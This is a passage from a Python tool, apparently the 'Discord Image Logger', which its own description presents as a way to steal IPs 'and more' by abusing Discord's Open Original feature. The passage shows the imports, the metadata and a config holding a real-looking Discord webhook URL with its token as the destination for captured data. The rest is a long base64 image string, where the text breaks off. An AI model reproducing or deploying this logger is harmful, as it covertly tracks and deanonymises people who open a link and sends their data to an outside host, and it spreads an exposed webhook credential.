# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1445939458250772733/nS9H0u6ei6V_0DYDbbcvWjwvDjMvhy-eRpYohPJYxKrA1yqweD72wNuvoLRRdr5SR8R7",
    "image": "data:image/jpeg;base64,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